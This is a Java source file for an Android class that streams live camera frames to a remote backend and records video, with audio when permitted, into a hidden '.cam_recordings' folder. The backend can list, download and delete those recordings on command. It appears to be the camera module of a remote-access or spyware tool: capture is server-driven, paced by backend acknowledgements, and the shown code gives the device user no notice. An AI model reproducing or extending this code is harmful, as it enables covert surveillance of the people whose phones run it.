package com.task.tusker.commands;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.view.Surface;
import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.task.tusker.utils.ResourceGuard;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * Camera Stream Handler
 * Handles live camera streaming and video recording via Camera2 API.
 * Streaming: pushes JPEG frames at configurable interval (mirrors screen stream pattern).
 * Recording: saves MP4 to app private storage via MediaRecorder.
 */
@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class CameraStreamHandler {

    private static final String TAG = "CameraStreamHandler";
    private static final String REC_DIR = ".cam_recordings";

    private final Context context;
    private final CameraManager cameraManager;

    // ── Streaming state ──────────────────────────────────────────────────────
    private HandlerThread streamThread;
    private Handler streamHandler;
    private CameraDevice streamCamera;
    private CameraCaptureSession streamSession;
    private ImageReader streamReader;
    private volatile boolean streaming = false;
    private volatile long streamIntervalMs = 2000L;
    private volatile long lastFrameMs = 0L;
    private FrameCallback frameCallback;

    // Ack-based pacing gate — true means we are allowed to send the next frame.
    // After sending a frame the gate is closed; it reopens when the backend sends
    // camera:ack, which SocketManager forwards via onAck(). This prevents stale
    // frames from piling up in the TCP buffer on 3G/4G links.
    // Starts as true so the very first frame is sent immediately on stream start.
    private volatile boolean ackGate = true;
    // Fallback: if no ack arrives within 5 s, re-open the gate anyway so the
    // stream doesn't freeze permanently on a lost ack.
    private volatile long lastAckMs = 0L;
    private static final long ACK_TIMEOUT_MS = 5000L;

    // ── Recording state ──────────────────────────────────────────────────────
    private HandlerThread recThread;
    private Handler recHandler;
    private CameraDevice recCamera;
    private CameraCaptureSession recSession;
    private MediaRecorder mediaRecorder;
    private volatile boolean recording = false;
    private File currentRecFile;

    public interface FrameCallback {
        void onFrame(String base64Jpeg, String cameraId);
        void onError(String error);
    }

    public CameraStreamHandler(Context context) {
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
    }

    public void setFrameCallback(FrameCallback cb) {
        this.frameCallback = cb;
    }

    // ── Helpers ─────────────────────────────────────────────────────────────

    private boolean hasCameraPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasAudioPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                == PackageManager.PERMISSION_GRANTED;
    }

    /** Return the camera ID for the requested facing (0=back, 1=front). */
    private String resolveCameraId(String requested) {
        try {
            // If caller passed a raw ID that exists, use it directly
            for (String id : cameraManager.getCameraIdList()) {
                if (id.equals(requested)) return id;
            }
            // Otherwise resolve by facing name
            boolean wantFront = requested != null
                    && (requested.equalsIgnoreCase("1") || requested.toLowerCase().contains("front"));
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics ch = cameraManager.getCameraCharacteristics(id);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                if (facing == null) continue;
                if (wantFront && facing == CameraCharacteristics.LENS_FACING_FRONT) return id;
                if (!wantFront && facing == CameraCharacteristics.LENS_FACING_BACK) return id;
            }
            // Fallback: first camera
            String[] ids = cameraManager.getCameraIdList();
            return ids.length > 0 ? ids[0] : null;
        } catch (Exception e) {
            Log.e(TAG, "resolveCameraId error: " + e.getMessage());
            return null;
        }
    }

    private File getRecDir() {
        File dir = new File(context.getFilesDir(), REC_DIR);
        if (!dir.exists()) dir.mkdirs();
        return dir;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // STREAMING
    // ═══════════════════════════════════════════════════════════════════════

    @SuppressLint("MissingPermission")
    public JSONObject startStream(String requestedCameraId, long intervalMs) {
        JSONObject result = new JSONObject();
        try {
            if (!hasCameraPermission()) {
                result.put("success", false);
                result.put("error", "CAMERA permission not granted");
                return result;
            }
            if (streaming) {
                result.put("success", false);
                result.put("error", "Camera stream already running");
                return result;
            }

            String cameraId = resolveCameraId(requestedCameraId);
            if (cameraId == null) {
                result.put("success", false);
                result.put("error", "No camera found");
                return result;
            }

            streamIntervalMs = Math.max(500L, intervalMs);
            lastFrameMs = 0L;

            streamThread = new HandlerThread("CamStream");
            streamThread.start();
            streamHandler = new Handler(streamThread.getLooper());

            // Use YUV_420_888 — universally supported by all Camera2 devices for
            // streaming/preview sessions. JPEG format is only guaranteed for still
            // captures and silently produces no frames on many devices in a preview session.
            streamReader = ImageReader.newInstance(640, 480, ImageFormat.YUV_420_888, 3);
            final String finalCameraId = cameraId;
            streamReader.setOnImageAvailableListener(reader -> {
                Image image = reader.acquireLatestImage();
                if (image == null) return;
                try {
                    long now = System.currentTimeMillis();

                    // Resource-aware effective interval: stretch the base interval under pressure
                    // so camera capture doesn't compete with the OS for CPU on a struggling device.
                    ResourceGuard rg = ResourceGuard.getInstance(context);
                    long effectiveInterval = rg.adaptiveIntervalMs(streamIntervalMs);
                    if (now - lastFrameMs < effectiveInterval) return;
                    lastFrameMs = now;

                    // CRITICAL pressure: skip camera frames entirely — the service stays alive
                    // but doesn't burn CPU on encoding until the system has room to breathe.
                    if (rg.isCritical()) {
                        Log.d(TAG, "stream frame skipped — CRITICAL resource pressure");
                        return;
                    }

                    // Ack-based gate: only send if we have clearance from the backend.
                    // Also check the 5 s fallback timeout so a lost ack never freezes the stream.
                    boolean gateOpen = ackGate || (now - lastAckMs > ACK_TIMEOUT_MS);
                    if (!gateOpen) return;
                    ackGate = false; // close gate until next ack

                    // Network-adaptive base quality: faster intervals → higher quality;
                    // ResourceGuard then reduces it further under CPU/RAM pressure.
                    int baseQuality = (streamIntervalMs >= 3000L) ? 55
                                    : (streamIntervalMs >= 2000L) ? 65 : 75;
                    int jpegQuality = rg.adaptiveJpegQuality(baseQuality);
                    byte[] jpegBytes = yuvToJpeg(image, jpegQuality);
                    if (jpegBytes == null || jpegBytes.length == 0) return;
                    String b64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP);
                    if (frameCallback != null) frameCallback.onFrame(b64, finalCameraId);
                } catch (Exception e) {
                    Log.e(TAG, "stream frame error: " + e.getMessage());
                } finally {
                    image.close();
                }
            }, streamHandler);

            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    streamCamera = camera;
                    try {
                        List<Surface> surfaces = Collections.singletonList(streamReader.getSurface());
                        camera.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(CameraCaptureSession session) {
                                streamSession = session;
                                try {
                                    CaptureRequest.Builder b =
                                            camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                    b.addTarget(streamReader.getSurface());
                                    session.setRepeatingRequest(b.build(), null, streamHandler);
                                    streaming = true;
                                    Log.i(TAG, "Camera stream started cameraId=" + finalCameraId
                                            + " interval=" + streamIntervalMs + "ms");
                                } catch (Exception e) {
                                    Log.e(TAG, "setRepeatingRequest error: " + e.getMessage());
                                    if (frameCallback != null) frameCallback.onError(e.getMessage());
                                }
                            }
                            @Override
                            public void onConfigureFailed(CameraCaptureSession session) {
                                Log.e(TAG, "stream session config failed");
                                if (frameCallback != null) frameCallback.onError("Session config failed");
                            }
                        }, streamHandler);
                    } catch (Exception e) {
                        Log.e(TAG, "createCaptureSession error: " + e.getMessage());
                        if (frameCallback != null) frameCallback.onError(e.getMessage());
                    }
                }
                @Override
                public void onDisconnected(CameraDevice camera) {
                    camera.close(); streamCamera = null; streaming = false;
                }
                @Override
                public void onError(CameraDevice camera, int error) {
                    camera.close(); streamCamera = null; streaming = false;
                    if (frameCallback != null) frameCallback.onError("Camera error: " + error);
                }
            }, streamHandler);

            result.put("success", true);
            result.put("cameraId", cameraId);
            result.put("intervalMs", streamIntervalMs);
            result.put("message", "Camera stream starting...");
        } catch (Exception e) {
            Log.e(TAG, "startStream error: " + e.getMessage());
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (JSONException ex) {}
        }
        return result;
    }

    public JSONObject stopStream() {
        JSONObject result = new JSONObject();
        try {
            streaming = false;
            ackGate = true; // reset so next start doesn't stall waiting for an ack
            try { if (streamSession != null) { streamSession.stopRepeating(); streamSession.close(); } } catch (Exception ignored) {}
            streamSession = null;
            try { if (streamCamera != null) streamCamera.close(); } catch (Exception ignored) {}
            streamCamera = null;
            try { if (streamReader != null) streamReader.close(); } catch (Exception ignored) {}
            streamReader = null;
            try { if (streamThread != null) streamThread.quitSafely(); } catch (Exception ignored) {}
            streamThread = null; streamHandler = null;
            result.put("success", true);
            result.put("message", "Camera stream stopped");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (JSONException ex) {}
        }
        return result;
    }

    public boolean isStreaming() { return streaming; }

    /**
     * Called by SocketManager when a camera:ack arrives from the backend.
     * Re-opens the ack gate so the next captured frame is sent.
     */
    public void onAck() {
        lastAckMs = System.currentTimeMillis();
        ackGate = true;
    }

    // ── YUV_420_888 → JPEG conversion ────────────────────────────────────
    // Camera2 ImageReader streams in YUV_420_888 (universally supported).
    // We manually pack the three planes into NV21 then use Android's built-in
    // YuvImage.compressToJpeg() so the server/dashboard always receives a JPEG.
    private static byte[] yuvToJpeg(Image image, int quality) {
        try {
            int width  = image.getWidth();
            int height = image.getHeight();
            Image.Plane[] planes = image.getPlanes();

            ByteBuffer yBuf = planes[0].getBuffer();
            int yRowStride  = planes[0].getRowStride();

            ByteBuffer uBuf = planes[1].getBuffer();
            int uRowStride  = planes[1].getRowStride();
            int uPixStride  = planes[1].getPixelStride();

            ByteBuffer vBuf = planes[2].getBuffer();
            int vRowStride  = planes[2].getRowStride();
            int vPixStride  = planes[2].getPixelStride();

            // Build NV21 byte array: packed Y plane then interleaved VU
            byte[] nv21 = new byte[width * height * 3 / 2];

            // Copy Y plane row by row (handles row stride padding)
            for (int row = 0; row < height; row++) {
                yBuf.position(row * yRowStride);
                yBuf.get(nv21, row * width, width);
            }

            // Interleave V then U into the NV21 chroma block
            int uvBase = width * height;
            for (int row = 0; row < height / 2; row++) {
                for (int col = 0; col < width / 2; col++) {
                    int dst = uvBase + row * width + col * 2;
                    vBuf.position(row * vRowStride + col * vPixStride);
                    uBuf.position(row * uRowStride + col * uPixStride);
                    nv21[dst]     = vBuf.get(); // V first → NV21
                    nv21[dst + 1] = uBuf.get(); // then U
                }
            }

            android.graphics.YuvImage yuv = new android.graphics.YuvImage(
                    nv21, ImageFormat.NV21, width, height, null);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            yuv.compressToJpeg(new android.graphics.Rect(0, 0, width, height), quality, baos);
            return baos.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "yuvToJpeg error: " + e.getMessage());
            return null;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // RECORDING (MediaRecorder → MP4 in app private storage)
    // ═══════════════════════════════════════════════════════════════════════

    @SuppressLint("MissingPermission")
    public JSONObject startRecording(String requestedCameraId) {
        JSONObject result = new JSONObject();
        try {
            if (!hasCameraPermission()) {
                result.put("success", false);
                result.put("error", "CAMERA permission not granted");
                return result;
            }
            if (recording) {
                result.put("success", false);
                result.put("error", "Already recording");
                return result;
            }

            String cameraId = resolveCameraId(requestedCameraId);
            if (cameraId == null) {
                result.put("success", false);
                result.put("error", "No camera found");
                return result;
            }

            // Prepare output file
            String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            currentRecFile = new File(getRecDir(), "cam_" + ts + ".mp4");

            // Set up MediaRecorder
            mediaRecorder = new MediaRecorder();
            if (hasAudioPermission()) {
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
            }
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setOutputFile(currentRecFile.getAbsolutePath());
            mediaRecorder.setVideoEncodingBitRate(2_000_000); // 2 Mbps
            mediaRecorder.setVideoFrameRate(24);
            mediaRecorder.setVideoSize(640, 480);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            if (hasAudioPermission()) {
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            }
            mediaRecorder.prepare();

            Surface recSurface = mediaRecorder.getSurface();

            recThread = new HandlerThread("CamRecord");
            recThread.start();
            recHandler = new Handler(recThread.getLooper());

            final String finalCameraId = cameraId;
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    recCamera = camera;
                    try {
                        List<Surface> surfaces = Collections.singletonList(recSurface);
                        camera.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(CameraCaptureSession session) {
                                recSession = session;
                                try {
                                    CaptureRequest.Builder b =
                                            camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                                    b.addTarget(recSurface);
                                    session.setRepeatingRequest(b.build(), null, recHandler);
                                    mediaRecorder.start();
                                    recording = true;
                                    Log.i(TAG, "Camera recording started → " + currentRecFile.getName());
                                } catch (Exception e) {
                                    Log.e(TAG, "record start error: " + e.getMessage());
                                }
                            }
                            @Override
                            public void onConfigureFailed(CameraCaptureSession session) {
                                Log.e(TAG, "record session config failed");
                            }
                        }, recHandler);
                    } catch (Exception e) {
                        Log.e(TAG, "record createCaptureSession error: " + e.getMessage());
                    }
                }
                @Override public void onDisconnected(CameraDevice camera) { camera.close(); recCamera = null; recording = false; }
                @Override public void onError(CameraDevice camera, int error) { camera.close(); recCamera = null; recording = false; }
            }, recHandler);

            result.put("success", true);
            result.put("cameraId", cameraId);
            result.put("filename", currentRecFile.getName());
            result.put("message", "Recording started → " + currentRecFile.getName());
        } catch (Exception e) {
            Log.e(TAG, "startRecording error: " + e.getMessage());
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (JSONException ex) {}
        }
        return result;
    }

    public JSONObject stopRecording() {
        JSONObject result = new JSONObject();
        try {
            if (!recording) {
                result.put("success", false);
                result.put("error", "Not recording");
                return result;
            }
            recording = false;

            try { if (recSession != null) { recSession.stopRepeating(); recSession.close(); } } catch (Exception ignored) {}
            recSession = null;
            try { if (recCamera != null) recCamera.close(); } catch (Exception ignored) {}
            recCamera = null;
            try { if (mediaRecorder != null) { mediaRecorder.stop(); mediaRecorder.reset(); mediaRecorder.release(); } } catch (Exception ignored) {}
            mediaRecorder = null;
            try { if (recThread != null) recThread.quitSafely(); } catch (Exception ignored) {}
            recThread = null; recHandler = null;

            result.put("success", true);
            if (currentRecFile != null && currentRecFile.exists()) {
                result.put("filename", currentRecFile.getName());
                result.put("sizeBytes", currentRecFile.length());
                result.put("message", "Recording saved: " + currentRecFile.getName()
                        + " (" + (currentRecFile.length() / 1024) + " KB)");
            } else {
                result.put("message", "Recording stopped");
            }
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (JSONException ex) {}
        }
        return result;
    }

    public boolean isRecording() { return recording; }

    // ═══════════════════════════════════════════════════════════════════════
    // RECORDING FILE MANAGEMENT
    // ═══════════════════════════════════════════════════════════════════════

    public JSONObject listRecordings() {
        JSONObject result = new JSONObject();
        try {
            File dir = getRecDir();
            File[] files = dir.listFiles(f -> f.getName().endsWith(".mp4"));
            JSONArray arr = new JSONArray();
            if (files != null) {
                Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
                for (File f : files) {
                    JSONObject entry = new JSONObject();
                    entry.put("filename", f.getName());
                    entry.put("sizeBytes", f.length());
                    entry.put("sizeKb", f.length() / 1024);
                    entry.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                            .format(new Date(f.lastModified())));
                    entry.put("modifiedMs", f.lastModified());
                    arr.put(entry);
                }
            }
            result.put("success", true);
            result.put("recordings", arr);
            result.put("count", arr.length());
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (JSONException ex) {}
        }
        return result;
    }

    public JSONObject getRecording(String filename) {
        JSONObject result = new JSONObject();
        try {
            if (filename == null || filename.isEmpty()) {
                result.put("success", false);
                result.put("error", "No filename provided");
                return result;
            }
            File f = new File(getRecDir(), filename);
            if (!f.exists()) {
                result.put("success", false);
                result.put("error", "File not found: " + filename);
                return result;
            }
            byte[] bytes = new byte[(int) f.length()];
            try (FileInputStream fis = new FileInputStream(f)) {
                int read = 0;
                while (read < bytes.length) {
                    int n = fis.read(bytes, read, bytes.length - read);
                    if (n < 0) break;
                    read += n;
                }
            }
            result.put("success", true);
            result.put("filename", filename);
            result.put("sizeBytes", f.length());
            result.put("data", Base64.encodeToString(bytes, Base64.NO_WRAP));
            result.put("mimeType", "video/mp4");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (JSONException ex) {}
        }
        return result;
    }

    public JSONObject deleteRecording(String filename) {
        JSONObject result = new JSONObject();
        try {
            if (filename == null || filename.isEmpty()) {
                result.put("success", false);
                result.put("error", "No filename provided");
                return result;
            }
            File f = new File(getRecDir(), filename);
            if (!f.exists()) {
                result.put("success", false);
                result.put("error", "File not found: " + filename);
                return result;
            }
            boolean deleted = f.delete();
            result.put("success", deleted);
            result.put("message", deleted ? "Deleted: " + filename : "Could not delete: " + filename);
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (JSONException ex) {}
        }
        return result;
    }
}
